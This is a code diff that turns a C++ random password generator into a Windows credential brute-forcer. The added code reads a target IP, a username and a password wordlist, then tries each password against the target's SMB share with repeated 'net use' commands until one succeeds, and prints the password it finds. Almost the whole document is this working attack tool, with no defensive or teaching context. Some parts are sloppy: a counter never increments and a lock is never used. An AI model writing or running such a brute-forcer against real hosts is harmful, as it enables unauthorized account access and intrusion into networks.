@@ -1,72 +1,134 @@
 #include <iostream>
 #include <fstream>
 #include <string>
-#include <random>
-#include <chrono>
+#include <vector>
+#include <Windows.h>
 
-// Function to generate a random password of specified length
-std::string generatePassword(int length) {
-    const std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+";
-    std::random_device rd;
-    std::mt19937 generator(rd());
-    std::uniform_int_distribution<> distribution(0, characters.size() - 1);
+const size_t MAIN_BATCH_SIZE = 1000;  // Start with 1000 passwords per main batch
+bool passwordFound = false;           // Flag to check if the password was found
+int batchAttemptCount = 0;            // Counter for batch attempts
+CRITICAL_SECTION cs;                  // Windows critical section for thread-safe batch count
 
-    std::string password;
-    for (int i = 0; i < length; ++i) {
-        password += characters[distribution(generator)];
+// Function to execute a command and check its success
+bool executeCommand(const std::string& command) {
+    // Setup the process startup information (for wide-character support)
+    STARTUPINFOW si = { sizeof(STARTUPINFOW) };  // Use STARTUPINFOW for wide characters
+    PROCESS_INFORMATION pi;
+    
+    // Convert the command to a wide string (needed for CreateProcessW)
+    std::wstring wideCommand(command.begin(), command.end());
+
+    // Create the process (run the command) - Using CreateProcessW for wide character support
+    if (!CreateProcessW(NULL, &wideCommand[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
+        return false;
     }
 
-    std::cout << "Generated password: " << password << std::endl; // Debug log
-    return password;
+    // Wait for the process to finish
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    // Get the exit code of the process
+    DWORD exitCode;
+    if (GetExitCodeProcess(pi.hProcess, &exitCode) == 0) {
+        std::cerr << "Failed to get exit code: " << GetLastError() << std::endl;
+        return false;
+    }
+
+    // Close the process and thread handles
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    // Check if the exit code indicates success (0 means success for net use)
+    return exitCode == 0;
+}
+
+// Function to process a small batch directly (non-recursive)
+void processSmallBatch(const std::vector<std::string>& batch, const std::string& ip, const std::string& user) {
+    for (size_t i = 0; i < batch.size(); ++i) {
+        const std::string& password = batch[i];
+        
+        // Attempt to connect with the current password
+        std::string command = "net use \\\\" + ip + " /user:" + user + " " + password;
+        std::cout << "[Attempt " << batchAttemptCount << "] Trying password: " << password << std::endl;
+
+        if (executeCommand(command)) {
+            passwordFound = true;
+            std::cout << "Password Found: " << password << std::endl;
+            break;
+        }
+    }
+}
+
+// Function to split and process the batch recursively with threading
+void processBatchRecursive(std::vector<std::string>& batch, const std::string& ip, const std::string& user) {
+    // If the batch size is less than or equal to MAIN_BATCH_SIZE, process it directly
+    if (batch.size() <= MAIN_BATCH_SIZE) {
+        std::cout << "Batch size <= MAIN_BATCH_SIZE, processing directly." << std::endl;
+        processSmallBatch(batch, ip, user);
+        return;
+    }
+
+    // Split the batch into two parts
+    size_t mid = batch.size() / 2;
+    std::vector<std::string> firstHalf(batch.begin(), batch.begin() + mid);
+    std::vector<std::string> secondHalf(batch.begin() + mid, batch.end());
+
+    // Check if password is likely in the first half or the second half based on previous results
+    std::cout << "Processing first half of the batch..." << std::endl;
+    processSmallBatch(firstHalf, ip, user);
+
+    if (passwordFound) {
+        std::cout << "Password found in the first half." << std::endl;
+        return;
+    }
+
+    // Continue with second half if password wasn't found in the first half
+    std::cout << "Processing second half of the batch..." << std::endl;
+    processSmallBatch(secondHalf, ip, user);
 }
 
 int main() {
-    // Parameters: modify these to control the output
-    const int passwordLength = 12; // Length of each password
-    const int totalPasswords = 1000000; // Total number of passwords to generate
+    std::string ip, user, wordlist;
 
-    // Path and file name for saving passwords
-    std::string outputFilePath = "./passwords.txt"; // Modify this path as needed
+    // Initialize critical section
+    InitializeCriticalSection(&cs);
 
-    std::cout << "Output file path: " << outputFilePath << std::endl; // Debug log
+    // Get user input
+    std::cout << "Enter IP Address: ";
+    std::getline(std::cin, ip);
 
-    std::ofstream outputFile(outputFilePath);
-    if (!outputFile.is_open()) {
-        std::cerr << "Error: Unable to open file for writing." << std::endl;
+    std::cout << "Enter Username: ";
+    std::getline(std::cin, user);
+
+    std::cout << "Enter Password List: ";
+    std::getline(std::cin, wordlist);
+
+    // Open the wordlist file
+    std::ifstream file(wordlist);
+    if (!file) {
+        std::cerr << "Error: Could not open file " << wordlist << std::endl;
         return 1;
     }
 
-    std::cout << "Generating " << totalPasswords << " passwords..." << std::endl;
+    // Read the passwords into a vector
+    std::vector<std::string> passwords;
+    std::string line;
+    while (std::getline(file, line)) {
+        passwords.push_back(line);
+    }
+    file.close();
 
-    auto startTime = std::chrono::high_resolution_clock::now();
+    // Process the password list in batches using recursion
+    processBatchRecursive(passwords, ip, user);
 
-    for (int i = 1; i <= totalPasswords; ++i) {
-        std::string password = generatePassword(passwordLength);
-        outputFile << password << "\n";
-
-        // Debug log for progress
-        if (i % 10000 == 0) {
-            std::cout << "Generated " << i << " passwords so far..." << std::endl;
-        }
-
-        // Print progress for every 100,000 passwords generated
-        if (i % 100000 == 0 || i == totalPasswords) {
-            std::cout << i << " of " << totalPasswords << " passwords generated." << std::endl;
-        }
+    if (!passwordFound) {
+        std::cout << "Password not found." << std::endl;
     }
 
-    outputFile.close();
+    std::cout << "Operation Complete." << std::endl;
 
-    auto endTime = std::chrono::high_resolution_clock::now();
-    std::chrono::duration<double> elapsed = endTime - startTime;
-
-    std::cout << "Password generation completed in " << elapsed.count() << " seconds." << std::endl;
-    std::cout << "Passwords saved to " << outputFilePath << std::endl;
-
-    // Prevent the terminal from closing immediately
-    std::cout << "Press Enter to exit...";
-    std::cin.ignore();
-    std::cin.get();
+    // Clean up critical section
+    DeleteCriticalSection(&cs);
 
     return 0;
 }
